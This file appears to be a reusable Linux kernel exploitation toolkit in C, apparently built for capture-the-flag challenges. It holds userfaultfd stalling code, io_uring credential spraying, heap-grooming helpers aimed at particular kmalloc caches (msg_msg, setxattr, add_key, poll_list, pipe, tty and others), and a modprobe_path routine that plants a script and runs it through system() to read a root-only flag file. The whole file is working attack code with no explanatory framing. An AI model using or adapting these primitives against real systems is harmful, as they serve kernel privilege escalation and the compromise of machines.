#define _GNU_SOURCE
#define __USE_MISC

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <assert.h>

#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <poll.h>
#include <sys/mman.h>

#include <sys/timerfd.h>

# define MSG_COPY 040000
#include <sys/ipc.h>
#include <sys/msg.h>

#include <sched.h>

#include <sys/xattr.h>

#include <sys/socket.h>
#include <arpa/inet.h>

#include <sys/prctl.h> 
#ifndef PR_SET_VMA
#define PR_SET_VMA 0x53564d41
#define PR_SET_VMA_ANON_NAME 0
#endif

#include <linux/io_uring.h>
#include <sys/capability.h>

#define PAGE_SIZE 0x1000

typedef unsigned long ul;


// pin_cpu
void pin_cpu(int core){
	cpu_set_t cpu;
    CPU_ZERO(&cpu);
    CPU_SET(core, &cpu);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpu);
}


// userfaultfd
void* uffd_handler(long uffd){
	struct uffd_msg uf_msg;
	struct pollfd pollfd;
	pollfd.fd = (int) uffd;
	pollfd.events = POLLIN;

	while(poll(&pollfd, 1, -1) > 0){
        if(pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
            perror("poll");

        // read an event
        if(read(uffd, &uf_msg, sizeof(uf_msg)) == 0)
            perror("read");

        if(uf_msg.event != UFFD_EVENT_PAGEFAULT)
            perror("unexpected pagefault");

        printf("[!] page fault: %p\n", (void*) uf_msg.arg.pagefault.address);

		sleep(3600);
    }

	return NULL;
}   

void register_userfault(void* addr, void* (*handler)(void* arg)){
    static pthread_t thread;;
	long uffd, handle;
	struct uffdio_api uf_api;
	struct uffdio_register uf_register;

	uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd < 0)
        perror("userfaultfd");

	uf_api.api = UFFD_API;
	uf_api.features = 0;
	if (ioctl(uffd, UFFDIO_API, &uf_api) == -1)
	{
		perror("error with the uffdio_api");
		exit(-1);
	}


	mmap(addr, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);

	uf_register.range.start = (unsigned long long) addr;
	uf_register.range.len = 0x1000;
	uf_register.mode = UFFDIO_REGISTER_MODE_MISSING;
	if (ioctl(uffd, UFFDIO_REGISTER, &uf_register) == -1)
	{
		perror("error registering page for userfaultfd");
	}

	handle = pthread_create(&thread, NULL, handler, (void*) uffd);
	if(handle != 0)
	{
		perror("can't setup threads for handle");
	}
    
	return;
}


// spray creds
struct user_cap_data_struct {
    uint32_t effective;
    uint32_t permitted;
    uint32_t inheritable;
};

static int sys_io_uring_setup(size_t entries, struct io_uring_params *p)
{
    return syscall(__NR_io_uring_setup, entries, p);
}

static int uring_create(size_t n_sqe, size_t n_cqe)
{
    struct io_uring_params p = {
        .cq_entries = n_cqe,
        .flags = IORING_SETUP_CQSIZE
    };

    int res = sys_io_uring_setup(n_sqe, &p);
    if (res < 0)
        perror("io_uring_setup");
    return res;
}

static int alloc_n_creds(int uring_fd, size_t n_creds)
{
    for (size_t i = 0; i < n_creds; i++) {
        struct __user_cap_header_struct cap_hdr = {
            .pid = 0,
            .version = _LINUX_CAPABILITY_VERSION_3
        };

        struct user_cap_data_struct cap_data[2] = {
            {.effective = 0, .inheritable = 0, .permitted = 0},
            {.effective = 0, .inheritable = 0, .permitted = 0}
        };

        /* allocate new cred */
        if (syscall(SYS_capset, &cap_hdr, (void *)cap_data))
            perror("capset");

        /* increment refcount so we don't free it afterwards*/
        if (syscall(SYS_io_uring_register, uring_fd, IORING_REGISTER_PERSONALITY, 0, 0) < 0)
            perror("io_uring_register");
    }
}

int spray_creds(int n){
	int uring_cred_dumps[2] = {uring_create(0x80, 0x100), uring_create(0x80, 0x100)};
    alloc_n_creds(uring_cred_dumps[0], n);
	return uring_cred_dumps[0];
}


// timerfd - kmalloc-256
int alloc_timer(int sleep_sec){
    struct itimerspec its;

    its.it_interval.tv_sec = 0;
    its.it_interval.tv_nsec = 0;
    its.it_value.tv_sec = sleep_sec;
    its.it_value.tv_nsec = 0;

    int tfd = timerfd_create(CLOCK_REALTIME, 0);
    timerfd_settime(tfd, 0, &its, 0);

	return tfd;
}


// msg_msg - kmalloc-cg-(64-4k)		*0x30 of header + gets segmented > 4048 (segment header == 8)
				// user data
int alloc_msg(void* data, size_t size){
    int qid;

    qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
	msgsnd(qid, data, size, 0);

    return qid;
}

void free_msg(int qid, void* buf, size_t size){
    msgrcv(qid, buf, size, 0, IPC_NOWAIT | MSG_NOERROR);
}


// setxattr	- kmalloc-x				*immediately freed + the attribute can be whatever you want (it's actually not needed the "user." at the beginning; it gets allocated anyway), but it ends up on the stack :/
				// user data
void alloc_setxattr(char* file, char* data){
	setxattr(file, "user.sbrugna", data, strlen(data), 0);
}


// add_key - kmalloc-x				*sbrugna gets traced by kmalloc-tracer but is limited to 4k, palle doesn't get traced by kmalloc-tracer but covers all caches
				// user data			   you can alloc with palle empty
										// immediately freed + the type can be whatever you want (it's actually not needed to be a real type; it gets allocated anyway), but it ends up on the stack :/
void alloc_key(char* sbrugna, char* palle){
	syscall(SYS_add_key, "user", sbrugna, palle, strlen(palle));
}


// sendmsg - kmalloc-(64-1k)		*immediately freed + second dword gets zeroed out	
				// user data
int get_socket(){
	return socket(AF_INET, SOCK_DGRAM, 0);
}

void alloc_sendmsg(int sockfd, char* data, int size){
	struct msghdr msg = {0};
	struct sockaddr_in addr = {0};

	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(6666);

	msg.msg_control = data;
	msg.msg_controllen = size; 

	msg.msg_name = (caddr_t) &addr;
	msg.msg_namelen = sizeof(addr);

	if(sendmsg(sockfd, &msg, 0) < 0){
        perror("sendmsg");
    }
}


// SET_ANON_VMA_NAME - kmalloc-(8-96)
				// user data
void* alloc_anon(void* addr, char* data){
	void* res;
	res = mmap(addr, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	prctl(PR_SET_VMA, PR_SET_VMA_ANON_NAME, res, 0x1000, data);
	
	return res;
}


// pipe - kmalloc-cg-192 + kmalloc-cg-1k (+ a page from the buddy allocator as a buffer, but who cares)
void alloc_pipe(int* fds){
	pipe(fds);
	close(fds[1]);
}


// tty - kmalloc-32 + kmalloc-cg-1k
int alloc_tty(){
	return open("/dev/ptmx", O_RDONLY);
}


// socket pair - kmalloc-cg-512
				// user data
int alloc_socket_pair(int* ss, char* data, int size){
	socketpair(AF_UNIX, SOCK_STREAM, 0, ss);
	return write(ss[1], data, size);
}


// poll_list - kmalloc-(32-4k)
#define N_STACK_PPS 30
#define POLLFD_PER_PAGE 510
#define POLL_LIST_SIZE 16

#define NFDS(size) (((size - POLL_LIST_SIZE) / sizeof(struct pollfd)) + N_STACK_PPS);


pthread_t poll_tid[0x1000];
size_t poll_threads;
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

struct poll_list {
    struct poll_list *next;
    int len;
    struct pollfd entries[];
};

struct t_args {
    int id;
    int nfds;
    int timeout;
	int fd;
};

void *__alloc_poll_list(void *args) {
    struct pollfd *pfds;
    int nfds, timeout, id, fd;

    id    = ((struct t_args *)args)->id;
    nfds  = ((struct t_args *)args)->nfds;
    timeout = ((struct t_args *)args)->timeout;
    fd = ((struct t_args *)args)->fd;

    pfds = calloc(nfds, sizeof(struct pollfd));

    for (int i = 0; i < nfds; i++)
    {
        pfds[i].fd = fd;
        pfds[i].events = POLLERR;
    }

    pthread_mutex_lock(&mutex);
    poll_threads++;
    pthread_mutex_unlock(&mutex);

    //printf("[Thread %d] Start polling...\n", id);
    int ret = poll(pfds, nfds, timeout);
    //printf("[Thread %d] Polling complete: %d!\n", id, ret); 
}


void create_poll_thread(int id, size_t size, int timeout, int fd) {
    struct t_args *args;

    args = calloc(1, sizeof(struct t_args));

    if (size > PAGE_SIZE)
        size = size - ((size/PAGE_SIZE) * sizeof(struct poll_list));

    args->id = id;
    args->nfds = NFDS(size);
    args->timeout = timeout;
    args->fd = fd;

    pthread_create(&poll_tid[id], 0, __alloc_poll_list, (void *)args);
}

void join_poll_threads() {
    for (int i = 0; i < poll_threads; i++)
        pthread_join(poll_tid[i], NULL);
        
    poll_threads = 0;
}

void alloc_poll_list(char* filename, int size, int time, int n) {

	int fd = open(filename, O_RDONLY);

	for (int i = 0; i < n; i++)
		create_poll_thread(i, size, time, fd);

	join_poll_threads();
}


// modprobe
void modprobe(char* path, char* modpobe_path) {
    int size = strlen(path) + 0x20;
	char daje_roma[size];
	char flag[size];
	char trigger[size];

	snprintf(daje_roma, size, "%s/daje_roma", path);
	snprintf(flag, size, "%s/flag", path);
	snprintf(trigger, size, "%s/trigger", path);


    const char format[102] = {"touch %s;"
        "echo -e '#!/bin/sh\ncat %s > %s' > %s;"
        "echo -e '\xff\xff\xff\xff' > %s;"
        "chmod +x %s; chmod +x %s;"

        "%s;"
        "cat %s;"
    };

    char cmd[sizeof(format) + size*9];

    snprintf(cmd, sizeof(cmd), format, daje_roma, flag, daje_roma, modpobe_path, trigger, modpobe_path, trigger, trigger, daje_roma);
    system(cmd);
}


// debug shit
void print_hex(char* data, int len){
	for (int i = 0; i < len; i += 0x10) {
		printf("%03x: ", i);
		for (int j = 0; j < 0x10 && i + j < len; j++) {
			printf("%02x ", (unsigned char) data[i + j]);
		}
		printf("\n");
	}
}

void stop(char* log){
	if (!log)
		puts("[!] pause");
	else
		printf("[!] %s\n", log);
	#ifdef DBG
	getchar();
	#endif
}

void leak(char* what, unsigned long where){
	printf("%s @ %p\n", what, (void*) where);
}
